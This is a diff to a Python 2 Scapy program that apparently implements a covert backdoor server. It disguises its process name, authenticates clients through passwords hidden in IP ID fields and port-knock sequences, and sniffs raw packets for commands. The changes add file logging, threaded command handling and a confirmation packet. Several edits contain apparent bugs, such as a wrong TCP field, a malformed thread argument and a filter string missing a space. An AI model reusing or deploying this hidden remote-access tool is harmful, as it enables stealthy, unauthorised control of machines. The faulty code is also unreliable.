@@ -16,8 +16,10 @@
 '''
 from config import *
 from scapy.all import *
-import os
 import setproctitle
+import os
+import thread
+import time
 
 '''
 ------------------------------------------------------------------------------
@@ -53,7 +55,6 @@ def main():
 		# Masking the process name
 		if len(mask) > 1:
 			setproctitle.setproctitle(mask)
-
 		try:
 			# Setting up the packet filter to limit scanned packets
 			# The stricter the filter, the fewer packets to process and therefore the better the performance
@@ -68,10 +69,16 @@ def main():
 						packetFilter = packetFilter + " or ip src " + source
 				packetFilter = packetFilter + ")"
 
+			if len(log) > 0:
+				with open(log, "a") as logFile:
+					logFile.write("Server starting up at " + time.ctime() + "\n")
+
 			# Beginning Packet sniffing
 			sniff(filter=packetFilter, prn=server())
 		except KeyboardInterrupt:
-			print "Shutting Down"
+			if len(log) > 0:
+				with open(log, "a") as logFile:
+					logFile.write("Server shutting down at " + time.ctime() + "\n")
 
 '''
 ------------------------------------------------------------------------------
@@ -109,12 +116,12 @@ def server():
 			if checkPassword(packet[IP].src, packet[IP].id):
 				if len(knock) > 0:
 					if checkKnock(packet[IP].src, packet[TCP].dport):
-						clientCommands(packet)
+						thread.start_new_thread(clientCommands, (packet))
 				else:
-					clientCommands(packet)
+					thread.start_new_thread(clientCommands, (packet))
 		elif len(knock) > 0:
 			if checkKnock(packet[IP].src, packet[TCP].dport):
-				clientCommands(packet)
+				thread.start_new_thread(clientCommands, (packet))
 
 	return getResponse
 
@@ -152,6 +159,7 @@ def checkPassword(ip, ipid):
 				# Only compare to passwords short enough to be contained within the password buffer
 				if len(passCheck[i][1]) >= len(password):
 					if password in passCheck[i][1]:
+						passCheck.pop(i)
 						return True
 				elif len(knock) == 0:
 					tooLong = False
@@ -201,6 +209,7 @@ def checkKnock(ip, port):
 					if knock[j] != knockCheck[i][1][j]:
 						goodKnock = False
 				if goodKnock:
+					knockCheck.pop(i)
 					return True
 				else:
 					# If it's invalid then flush the buffer
@@ -234,7 +243,35 @@ def checkKnock(ip, port):
 ------------------------------------------------------------------------------
 '''
 def clientCommands(packet):
-	print "Connection Established with " + packet[IP].src
+	if len(log) > 0:
+		with open(log, "a") as logFile:
+			logFile.write("Connection Established with " + packet[IP].src + "at " + time.ctime() + "\n")
+
+	seq = random.randint(0, 16777215)
+	ipid = random.randint(0, 65535)
+
+	confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
+	                TCP(sport=random.randint(0, 65535), dport=packet[TCP].src, seq=seq)
+	send(confirmPacket, verbose=0)
+
+	try:
+		# Setting up the packet filter to limit scanned packets
+		# The stricter the filter, the fewer packets to process and therefore the better the performance
+		packetFilter = "tcp and ip src " + packet[IP].src
+		if len(ports) > 0:
+			first = True
+			for source in ports:
+				if first:
+					packetFilter = packetFilter + "and (src port " + source
+					first = False
+				else:
+					packetFilter = packetFilter + " or src port " + source
+			packetFilter = packetFilter + ")"
+
+		# Beginning Packet sniffing
+		sniff(filter=packetFilter, prn=server())
+	except KeyboardInterrupt:
+		print "Shutting Down"
 
 main()
 
